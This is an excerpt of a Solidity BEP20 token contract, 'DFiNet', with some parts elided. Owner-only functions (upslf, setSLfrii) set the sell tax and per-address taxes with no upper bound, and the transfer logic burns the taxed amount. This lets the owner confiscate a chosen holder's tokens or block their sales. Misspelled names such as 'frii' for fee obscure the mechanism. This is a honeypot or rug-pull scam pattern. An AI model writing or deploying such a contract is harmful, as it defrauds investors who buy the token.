 ...
 *
 * This module is used through inheritance. It will make available the modifriir
...
contract DFiNet is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfrii = 3;

    uint256 private _defaultBuyfrii = 0;


    mapping(address => bool) private _marketacounts;

    mapping(address => uint256) private _SLfrii;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfrii = _value;
    }


    function setSLfrii(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfrii[_address] = _value;
    }

    function getSLfrii(address _address) external view onlyowner returns (uint256) {
        return _SLfrii[_address];
    }


    function setMarketacountsfrii(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfrii(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token friis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefrii = _defaultSellfrii;
                }
                if (sender == uniswapV2Pair) {

                    tradefrii = _defaultBuyfrii;
                }
            }
            if (_SLfrii[sender] > 0) {
                tradefrii = _SLfrii[sender];
            }

            tradefriiAmount = amount.mul(tradefrii).div(100);
        }


        if (tradefriiAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefriiAmount);
            emit Transfer(sender, _DEADaddress, tradefriiAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefriiAmount);
        emit Transfer(sender, recipient, amount - tradefriiAmount);
    }
